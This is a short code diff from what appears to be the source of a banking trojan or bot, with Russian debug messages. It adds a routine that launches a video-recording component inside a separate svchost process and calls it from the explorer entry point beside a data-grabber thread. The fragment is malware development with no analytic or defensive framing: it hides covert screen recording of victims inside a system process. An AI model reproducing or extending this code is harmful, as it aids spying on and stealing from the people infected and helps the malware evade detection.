@@ -133,6 +133,12 @@ bool RunLoaderRoutine()
 	return true;
 }
 
+bool RunVideoProcess()
+{
+	MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
+	return MegaJump( VideoProcess::StartSvchost );
+}
+
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
@@ -176,10 +182,12 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	bool FirstSended = false;
 
 	#ifdef VideoRecorderH
-		if( VideoProcess::Start() )
-			MDBG( "Main", "Запустили видео процесс" );
-		else
-			MDBG( "Main", "ERROR: не запустился видео процесс" ); 
+		#ifndef VideoProcessSvchost
+			if( VideoProcess::Start() )
+				MDBG( "Main", "Запустили видео процесс" );
+			else
+				MDBG( "Main", "ERROR: не запустился видео процесс" ); 
+		#endif //VideoProcessSvchost
 	#endif
 
 	if (InitializeTaskManager(NULL, true))
@@ -265,7 +273,10 @@ void ExplorerMain()
 		//MegaJump( LoaderRoutine );
 		//RunBotBypassUAC(0);
 	}
-	
+	#ifdef VideoProcessSvchost
+		RunVideoProcess();
+	#endif
+
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun )
 			MegaJump( GrabberThread ); 
